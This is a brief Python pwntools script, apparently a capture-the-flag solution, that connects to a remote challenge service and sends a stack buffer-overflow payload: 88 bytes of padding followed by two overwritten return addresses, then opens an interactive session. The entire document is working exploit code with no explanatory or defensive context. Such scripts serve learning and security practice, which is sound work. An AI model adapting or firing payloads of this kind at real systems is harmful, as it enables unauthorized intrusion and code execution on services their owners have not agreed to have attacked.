from pwn import *

p = remote("tcp.espark.tn", 5000)  # Connect to the remote service
pause()  # Pause execution, so you can attach GDB/Pwndbg if needed

payload = b'A' * 88 + p64(0x00000000004010a0) + p64(0x0000000000401156)
p.sendline(payload)
p.interactive()